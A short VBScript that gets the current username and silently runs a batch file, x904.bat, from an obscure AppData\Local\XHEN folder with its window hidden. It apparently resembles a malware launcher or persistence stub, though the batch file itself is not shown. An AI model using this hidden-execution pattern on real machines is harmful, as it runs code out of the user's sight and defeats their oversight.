Set WshShell = CreateObject("WScript.Shell") 
username = WshShell.ExpandEnvironmentStrings("%username%")
WshShell.Run chr(34) & "C:\Users\" & username & "\AppData\Local\XHEN\x904.bat" & Chr(34), 0
Set WshShell = Nothing